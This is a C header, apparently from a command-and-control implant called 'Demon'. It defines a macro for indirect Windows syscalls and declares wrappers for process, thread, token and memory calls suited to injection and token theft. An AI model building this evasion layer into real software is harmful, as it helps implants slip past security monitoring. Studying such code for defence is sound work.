#ifndef DEMON_SYSNATIVE_H
#define DEMON_SYSNATIVE_H

#include <Common/Native.h>
#include <Core/Spoof.h>

/* define the OPT param option */
#ifndef OPT
#define OPT
#endif

#define SYSCALL_INVOKE( SYS_NAME, ... )                                                                      \
    if ( Instance.Config.Implant.SysIndirect && Instance.Syscall.SysAddress && Instance.Syscall.SYS_NAME ) { \
        SysConfig.Ssn = Instance.Syscall.SYS_NAME;                                                           \
        SysConfig.Adr = Instance.Syscall.SysAddress;                                                         \
        SysSetConfig( &SysConfig );                                                                          \
        NtStatus = SysInvoke( __VA_ARGS__ );                                                                 \
    } else {                                                                                                 \
        NtStatus = Instance.Win32.SYS_NAME( __VA_ARGS__ );                                                   \
    }                                                                                                        \
    PRINTF( "%s( ... ) = %08x\n", #SYS_NAME, NtStatus )

NTSTATUS NTAPI SysNtOpenThread(
    OUT    PHANDLE            ThreadHandle,
    IN     ACCESS_MASK        DesiredAccess,
    IN     POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPT PCLIENT_ID         ClientId
);

NTSTATUS NTAPI SysNtOpenThreadToken(
    IN  HANDLE      ThreadHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  BOOLEAN     OpenAsSelf,
    OUT PHANDLE     TokenHandle
);

NTSTATUS NTAPI SysNtOpenProcess(
    OUT    PHANDLE             ProcessHandle,
    IN     ACCESS_MASK         DesiredAccess,
    IN     POBJECT_ATTRIBUTES  ObjectAttributes,
    IN OPT PCLIENT_ID          ClientId
);

NTSTATUS NTAPI SysNtTerminateProcess(
    IN OPTIONAL HANDLE   ProcessHandle,
    IN          NTSTATUS ExitStatus
);

NTSTATUS NTAPI SysNtOpenProcessToken(
    IN  HANDLE      ProcessHandle,
    IN  ACCESS_MASK DesiredAccess,
    OUT PHANDLE     TokenHandle
);

NTSTATUS NTAPI SysNtDuplicateToken(
    IN  HANDLE             ExistingTokenHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    IN  BOOLEAN            EffectiveOnly,
    IN  TOKEN_TYPE         TokenType,
    OUT PHANDLE            NewTokenHandle
);

NTSTATUS NTAPI SysNtQueueApcThread(
    IN     HANDLE          ThreadHandle,
    IN     PPS_APC_ROUTINE ApcRoutine,
    IN OPT PVOID           ApcArgument1,
    IN OPT PVOID           ApcArgument2,
    IN OPT PVOID           ApcArgument3
);

NTSTATUS NTAPI SysNtSuspendThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSuspendCount
);

NTSTATUS NTAPI SysNtResumeThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSuspendCount
);

NTSTATUS NTAPI SysNtCreateEvent (
    OUT    PHANDLE            EventHandle,
    IN     ACCESS_MASK        DesiredAccess,
    IN OPT POBJECT_ATTRIBUTES ObjectAttributes,
    IN     EVENT_TYPE         EventType,
    IN     BOOLEAN            InitialState
);

NTSTATUS NTAPI SysNtCreateThreadEx(
    OUT PHANDLE     hThread,
    IN  ACCESS_MASK DesiredAccess,
    IN  PVOID       ObjectAttributes,
    IN  HANDLE      ProcessHandle,
    IN  PVOID       lpStartAddress,
    IN  PVOID       lpParameter,
    IN  ULONG       Flags,
    IN  SIZE_T      StackZeroBits,
    IN  SIZE_T      SizeOfStackCommit,
    IN  SIZE_T      SizeOfStackReserve,
    IN  PVOID       lpBytesBuffer
);

NTSTATUS NTAPI SysNtDuplicateObject(
    IN     HANDLE      SourceProcessHandle,
    IN     HANDLE      SourceHandle,
    IN OPT HANDLE      TargetProcessHandle,
    OUT    PHANDLE     TargetHandle,
    IN     ACCESS_MASK DesiredAccess,
    IN     ULONG       HandleAttributes,
    IN     ULONG       Options
);

NTSTATUS NTAPI SysNtGetContextThread (
    IN     HANDLE   ThreadHandle,
    IN OUT PCONTEXT ThreadContext
);

NTSTATUS NTAPI SysNtSetContextThread (
    IN     HANDLE   ThreadHandle,
    IN OUT PCONTEXT ThreadContext
);

NTSTATUS NTAPI SysNtQueryInformationProcess(
    IN      HANDLE           ProcessHandle,
    IN      PROCESSINFOCLASS ProcessInformationClass,
    OUT     PVOID            ProcessInformation,
    IN      ULONG            ProcessInformationLength,
    OUT OPT PULONG           ReturnLength
);

NTSTATUS NTAPI SysNtQuerySystemInformation (
    IN      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT OPT PVOID                    SystemInformation,
    IN      ULONG                    SystemInformationLength,
    OUT OPT PULONG                   ReturnLength
);

NTSTATUS NTAPI SysNtWaitForSingleObject(
    IN     HANDLE         Handle,
    IN     BOOLEAN        Alertable,
    IN OPT PLARGE_INTEGER Timeout
);

NTSTATUS NTAPI SysNtAllocateVirtualMemory(
    IN     HANDLE    ProcessHandle,
    IN OUT PVOID*    BaseAddress,
    IN     ULONG_PTR ZeroBits,
    IN OUT PSIZE_T   RegionSize,
    IN     ULONG     AllocationType,
    IN     ULONG     Protect
);

NTSTATUS NTAPI SysNtWriteVirtualMemory (
    IN       HANDLE  ProcessHandle,
    IN OPT   PVOID   BaseAddress,
    IN CONST VOID*   Buffer,
    IN       SIZE_T  BufferSize,
    OUT OPT  PSIZE_T NumberOfBytesWritten
);

NTSTATUS NTAPI SysNtFreeVirtualMemory(
    IN     HANDLE  ProcessHandle,
    IN OUT PVOID*  BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN     ULONG   FreeType
);

NTSTATUS NTAPI SysNtUnmapViewOfSection(
    IN HANDLE ProcessHandle,
    IN PVOID  BaseAddress
);

NTSTATUS NTAPI SysNtProtectVirtualMemory(
    IN     HANDLE  ProcessHandle,
    IN OUT PVOID*  BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN     ULONG   NewProtect,
    OUT    PULONG  OldProtect
);

NTSTATUS NTAPI SysNtReadVirtualMemory (
    IN      HANDLE  ProcessHandle,
    IN OPT  PVOID   BaseAddress,
    OUT     PVOID   Buffer,
    IN      SIZE_T  BufferSize,
    OUT OPT PSIZE_T NumberOfBytesRead
);

NTSTATUS NTAPI SysNtTerminateThread(
    IN OPT HANDLE   ThreadHandle,
    IN     NTSTATUS ExitStatus
);

NTSTATUS NTAPI SysNtAlertResumeThread(
    IN      HANDLE ThreadHandle,
    OUT OPT PULONG PreviousSuspendCount
);

NTSTATUS NTAPI SysNtSignalAndWaitForSingleObject(
    IN     HANDLE         SignalHandle,
    IN     HANDLE         WaitHandle,
    IN     BOOLEAN        Alertable,
    IN OPT PLARGE_INTEGER Timeout
);

NTSTATUS NTAPI SysNtQueryVirtualMemory(
    IN      HANDLE                   ProcessHandle,
    IN      PVOID                    BaseAddress,
    IN      MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT     PVOID                    MemoryInformation,
    IN      SIZE_T                   MemoryInformationLength,
    OUT OPT PSIZE_T                  ReturnLength
);

NTSTATUS NTAPI SysNtQueryInformationToken (
    IN  HANDLE                  TokenHandle,
    IN  TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID                   TokenInformation,
    IN  ULONG                   TokenInformationLength,
    OUT PULONG                  ReturnLength
);

NTSTATUS NTAPI SysNtQueryInformationThread(
    IN      HANDLE          ThreadHandle,
    IN      THREADINFOCLASS ThreadInformationClass,
    OUT     PVOID           ThreadInformation,
    IN      ULONG           ThreadInformationLength,
    OUT OPT PULONG          ReturnLength
);

NTSTATUS NTAPI SysNtQueryObject(
    IN  HANDLE                   Handle,
    IN  OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID                    ObjectInformation,
    IN  ULONG                    ObjectInformationLength,
    OUT PULONG                   ReturnLength
);

NTSTATUS NTAPI SysNtClose (
    IN HANDLE Handle
);

NTSTATUS NTAPI SysNtSetInformationThread (
    IN HANDLE          ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID           ThreadInformation,
    IN ULONG           ThreadInformationLength
);

NTSTATUS NTAPI SysNtSetInformationVirtualMemory(
    IN HANDLE                           ProcessHandle,
    IN VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass,
    IN ULONG_PTR                        NumberOfEntries,
    IN PMEMORY_RANGE_ENTRY              VirtualAddresses,
    IN PVOID                            VmInformation,
    IN ULONG                            VmInformationLength
);

NTSTATUS NTAPI SysNtGetNextThread(
    IN  HANDLE      ProcessHandle,
    IN  HANDLE      ThreadHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  ULONG       HandleAttributes,
    IN  ULONG       Flags,
    OUT PHANDLE     NewThreadHandle
);

#endif // DEMON_SYSNATIVE_H